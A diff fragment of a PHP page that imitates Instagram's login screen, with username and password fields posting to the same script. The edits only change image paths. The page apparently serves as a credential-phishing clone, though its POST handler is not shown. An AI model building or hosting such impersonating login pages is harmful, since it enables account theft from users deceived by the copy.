@@ -47,11 +47,11 @@ if($_SERVER["REQUEST_METHOD"] == "POST"){
 <body>
   <main class="l-main">
       <div class="l-main__img">
-        <img src="assets/img/homepage.png" alt="Smartphones">
+        <img src="homepage.png" alt="Smartphones">
       </div>
       <div class="l-user">
         <div class="c-panel group">
-          <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
+          <img class="c-panel__img" src="instagram.svg" alt="Instagram">
           <form method="POST" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
     <input type="text" class="c-panel__input" name="username" placeholder="Phone number, username, or email"><br>
     <input type="password" class="c-panel__input" name="password" placeholder="Password"><br>
@@ -70,8 +70,8 @@ if($_SERVER["REQUEST_METHOD"] == "POST"){
         <div class="c-app">
           <p>Get the app.</p>
           <div class="c-app__download">
-            <img src="assets/img/apple.png" alt="Apple Store">
-            <img src="assets/img/google.png" alt="Google Play">
+            <img src="apple.png" alt="Apple Store">
+            <img src="google.png" alt="Google Play">
           </div>
         </div>
       </div>
